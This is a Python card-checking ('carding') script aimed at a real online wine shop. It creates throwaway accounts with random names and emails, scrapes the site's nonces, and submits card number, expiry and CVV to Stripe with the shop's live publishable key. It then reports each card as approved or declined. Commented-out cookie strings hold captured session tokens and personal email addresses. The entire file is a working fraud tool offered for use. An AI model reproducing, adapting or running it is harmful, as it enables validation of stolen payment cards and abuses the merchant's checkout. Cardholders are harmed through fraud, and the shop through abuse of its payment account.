import base64
import requests
import random
import json
import names
from random_address import real_random_address
from bs4 import BeautifulSoup
import uuid




direc = real_random_address()

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session


def find_between(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None  

zipcode = direc['postalCode']
try:
    city = direc['city']
except KeyError:
    city = 'NY'
state = direc['state']
street = direc['address1']

class stripe4:
    def __init__(self, tarjeta):
        partes = tarjeta.split("|")
        
        self.tarjeta = tarjeta
        if len(partes) == 4:
            self.cc = partes[0]
            self.mes = partes[1]
            self.ano = partes[2]
            self.cvv = partes[3]
        self.username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        self.CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        self.Password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"
        
        
        
    def detectar_tipo_tarjeta(self):
        if self.cc.startswith("4"):
            return "Visa"
        elif self.cc.startswith("5"):
            return "MasterCard"
        elif self.cc.startswith("3"):
            return "American Express"
        elif self.cc.startswith("6"):
            return "Discover"
        else:
            return "Desconocido"
        
        
        
    def main(self):
        try:
            session = requests.Session()
            guid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            muid = str(uuid.uuid4()).replace('-', '') + 'f532e2'
            sid = str(uuid.uuid4()).replace('-', '') + '438b7a'
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.8',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://tierralunacellars.com/shop/my-account/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; age_gate=21; __stripe_mid=65b56041-032e-45ef-8a92-fca95a868a7f4208df; NFWSESSID=14483f109597d949062b735fa0d52f4d; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; mcforms-154044970-sessionId="3dbc8d8f-2b3e-487c-bb37-e2b94769c4ad"; mailchimp.cart.current_email=aladanube@gmail.com; mailchimp.cart.previous_email=aladanube@gmail.com; mailchimp_user_previous_email=aladanube%40gmail.com; mailchimp_user_email=aladanube%40gmail.com; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fshop%2Fmy-account%2F',
            }

            response = session.get('https://tierralunacellars.com/shop/my-account/',  headers=headers).text
            register = find_between(response, 'name="woocommerce-register-nonce" value="', '"')
            print(register)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://tierralunacellars.com',
                'priority': 'u=0, i',
                'referer': 'https://tierralunacellars.com/shop/my-account/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; age_gate=21; __stripe_mid=65b56041-032e-45ef-8a92-fca95a868a7f4208df; NFWSESSID=14483f109597d949062b735fa0d52f4d; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; mcforms-154044970-sessionId="3dbc8d8f-2b3e-487c-bb37-e2b94769c4ad"; mailchimp.cart.previous_email=aladanube@gmail.com; sbjs_session=pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fshop%2Fmy-account%2F; mailchimp.cart.current_email=sadasduytyudawd@gmail.com; mailchimp_user_previous_email=sadasduytyudawd%40gmail.com; mailchimp_user_email=sadasduytyudawd%40gmail.com',
            }

            data = {
                'email': self.CorreoRand,
                'mailchimp_woocommerce_newsletter': '1',
                'wc_order_attribution_source_type': 'typein',
                'wc_order_attribution_referrer': '(none)',
                'wc_order_attribution_utm_campaign': '(none)',
                'wc_order_attribution_utm_source': '(direct)',
                'wc_order_attribution_utm_medium': '(none)',
                'wc_order_attribution_utm_content': '(none)',
                'wc_order_attribution_utm_id': '(none)',
                'wc_order_attribution_utm_term': '(none)',
                'wc_order_attribution_utm_source_platform': '(none)',
                'wc_order_attribution_utm_creative_format': '(none)',
                'wc_order_attribution_utm_marketing_tactic': '(none)',
                'wc_order_attribution_session_entry': 'https://tierralunacellars.com/online-store/',
                'wc_order_attribution_session_start_time': '2026-01-25 01:55:20',
                'wc_order_attribution_session_pages': '4',
                'wc_order_attribution_session_count': '2',
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                'woocommerce-register-nonce': register,
                '_wp_http_referer': '/shop/my-account/',
                'register': 'Register',
            }

            response = session.post('https://tierralunacellars.com/shop/my-account/',  headers=headers, data=data)
            

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.8',
                'priority': 'u=0, i',
                'referer': 'https://tierralunacellars.com/shop/my-account/payment-methods/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'sec-gpc': '1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; age_gate=21; __stripe_mid=65b56041-032e-45ef-8a92-fca95a868a7f4208df; NFWSESSID=14483f109597d949062b735fa0d52f4d; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; mcforms-154044970-sessionId="3dbc8d8f-2b3e-487c-bb37-e2b94769c4ad"; mailchimp.cart.previous_email=aladanube@gmail.com; mailchimp.cart.current_email=sadasduytyudawd@gmail.com; mailchimp_user_previous_email=sadasduytyudawd%40gmail.com; mailchimp_user_email=sadasduytyudawd%40gmail.com; wordpress_logged_in_24cc1d76c1b3aa74d9f151f91da52b08=sadasduytyudawd%7C1770524431%7CPMQQGPvEv0orBuNeqSRxDtJj8e2UWfMhWA3KZb3DRCi%7Ca87c4b113df7fc4c17a82b1b87d278a6da2eebff08a1e5b46ad317041b787491; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fshop%2Fmy-account%2Fpayment-methods%2F',
            }

            response = session.get('https://tierralunacellars.com/shop/my-account/add-payment-method/', headers=headers).text
            aja = find_between(response, '"createAndConfirmSetupIntentNonce":"','"')
            print(aja)
            headers = {
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            data = f'type=card&card[number]={self.cc}&card[cvc]={self.cvv}&card[exp_year]={self.ano}&card[exp_month]={self.mes}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F065b474d33%3B+stripe-js-v3%2F065b474d33%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftierralunacellars.com&time_on_page=252953&client_attribution_metadata[client_session_id]=ef721581-acc9-48a3-8486-2265da8dcec7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=6501b286-090f-48b6-9e5b-e1b76787b2f8&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key=pk_live_51IE2c3EoMxzGhP4dJJYfU5NGX2RW1Pfl6VdKtufBAVtshGyzIf0Uf2qHLBmwv6zgW8rL9clFwoqzB8qdhw729St40062OjrQyd&_stripe_version=2024-06-20&radar_options'
            response = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data).json()
            id = response['id']
            print(id)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.8',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://tierralunacellars.com',
                'priority': 'u=1, i',
                'referer': 'https://tierralunacellars.com/shop/my-account/add-payment-method/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Brave";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
                # 'cookie': 'wordpress_sec_24cc1d76c1b3aa74d9f151f91da52b08=sadasduytyudawd%7C1770524431%7CPMQQGPvEv0orBuNeqSRxDtJj8e2UWfMhWA3KZb3DRCi%7Cfe82f277b6877375e38a4ba9371a9a7089b4375bc6cca085d8de23116a10d3f5; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-01-25%2001%3A55%3A20%7C%7C%7Cep%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fonline-store%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; age_gate=21; __stripe_mid=65b56041-032e-45ef-8a92-fca95a868a7f4208df; NFWSESSID=14483f109597d949062b735fa0d52f4d; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Safari%2F537.36; mcforms-154044970-sessionId="3dbc8d8f-2b3e-487c-bb37-e2b94769c4ad"; mailchimp.cart.previous_email=aladanube@gmail.com; mailchimp.cart.current_email=sadasduytyudawd@gmail.com; mailchimp_user_previous_email=sadasduytyudawd%40gmail.com; mailchimp_user_email=sadasduytyudawd%40gmail.com; wordpress_logged_in_24cc1d76c1b3aa74d9f151f91da52b08=sadasduytyudawd%7C1770524431%7CPMQQGPvEv0orBuNeqSRxDtJj8e2UWfMhWA3KZb3DRCi%7Ca87c4b113df7fc4c17a82b1b87d278a6da2eebff08a1e5b46ad317041b787491; __stripe_sid=6edaa1e1-eeb4-4065-9df0-58c66a736977124aa5; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftierralunacellars.com%2Fshop%2Fmy-account%2Fadd-payment-method%2F',
            }

            data = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': aja,
            }

            response = session.post('https://tierralunacellars.com/wp-admin/admin-ajax.php',  headers=headers, data=data)
            data = response.json()
            print(data)
            error = data['success'] and data['data']['status'] == 'succeeded'
            if error: return 'Approved! ✅', data['data']['status']
            else: return 'Declined ❌', data['data']['status']
        except: return 'Declined ❌','Your card was declined.'
        
